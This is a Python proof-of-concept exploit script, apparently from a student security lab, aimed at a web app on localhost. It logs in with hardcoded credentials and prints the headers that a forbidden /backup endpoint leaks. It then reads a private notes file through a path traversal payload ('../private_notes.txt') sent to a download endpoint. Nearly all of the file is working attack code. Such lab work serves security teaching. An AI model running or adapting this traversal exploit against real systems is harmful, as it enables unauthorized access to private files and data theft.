import sys
import requests


GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

#login and get session cookie
identity = "jdoe@student.42.tech"
password = "abc123"
auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": identity, "password": password},
    allow_redirects=False
)
 
cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print(f"{GREEN}Logged in successfully with " + identity + " and " + password )

print(f"{RESET}__________")
 

targeturl = "http://localhost:4942/backup"

print(f"{RESET}checking the status of http://localhost:4942/backup, we get a 403 as we are not authorized.")

response = requests.get(targeturl)
print(f"{RED}status code of http://localhost:4942/backup : "+ response.status_code.__str__())
print(f"{GREEN}However, the headers are not obfuscated and reveal sensitive data.")
print(f"{RESET}response headers of backup:\n")
print(response.headers)
print("__________")

input(f"{GREEN}press anything to continue: ")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"{CYAN}--- time to access data/private_notes.txt using the unprotected download function which allows not only whitelisted files to be downloaded---{RESET}")

input(f"{GREEN}accessing http://localhost:4942/projects/download?file=../private_notes.txt : ")

targeturl = "http://localhost:4942/projects/download?file=../private_notes.txt"
 
response = requests.get(targeturl, cookies=cookies)
print("__________")
print("response text of private notes:\n")
print(response.text)
print("__________")

print("status:", response.status_code)
